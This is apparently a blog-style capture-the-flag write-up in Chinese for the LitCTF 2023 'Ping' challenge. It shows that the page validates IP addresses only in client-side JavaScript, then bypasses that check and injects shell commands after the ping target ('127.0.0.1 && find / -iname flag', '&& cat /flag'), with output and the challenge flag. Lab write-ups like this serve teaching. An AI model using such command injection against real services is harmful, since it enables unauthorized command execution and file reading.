---
title: '[LitCTF 2023]Ping'
date: '2025-05-02T21:34:46+08:00'
weight: 
draft: false
description: '[LitCTF 2023]Ping'
---

检查页面元素，发现 `form` 的 `onsubmit` 属性在表单提交时触发 ` JavaScript` 代码，验证用户输入是否是一个合法的 IPv4 地址

![PixPin_2025-04-29_21-49-13](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_21-49-13.86tut2eb00.webp)

```javascript
function check_ip() {
    let ip = document.getElementById('command').value;
    let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/;

    if (re.test(ip.trim())) {
        return true;
    }
    alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦');
    return false;
}
```

禁用网页 ` JavaScript`，查找 `flag` 文件：`127.0.0.1 && find / -iname flag`

```shell
PING 127.0.0.1 (127.0.0.1): 56 data bytes

64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.065 ms

64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.051 ms

64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.051 ms

64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.057 ms

64 bytes from 127.0.0.1: seq=4 ttl=42 time=0.048 ms

64 bytes from 127.0.0.1: seq=5 ttl=42 time=0.058 ms



--- 127.0.0.1 ping statistics ---

6 packets transmitted, 6 packets received, 0% packet loss

round-trip min/avg/max = 0.048/0.055/0.065 ms

/flag
```

输出 `/flag` 内容：`127.0.0.1 && cat /flag`

```shell
PING 127.0.0.1 (127.0.0.1): 56 data bytes

64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.057 ms

64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.059 ms

64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.049 ms

64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.059 ms

64 bytes from 127.0.0.1: seq=4 ttl=42 time=0.054 ms

64 bytes from 127.0.0.1: seq=5 ttl=42 time=0.044 ms



--- 127.0.0.1 ping statistics ---

6 packets transmitted, 6 packets received, 0% packet loss

round-trip min/avg/max = 0.044/0.053/0.059 ms

flag=NSSCTF{a1dc7cb6-18e6-4011-868f-929e1834457c}
```

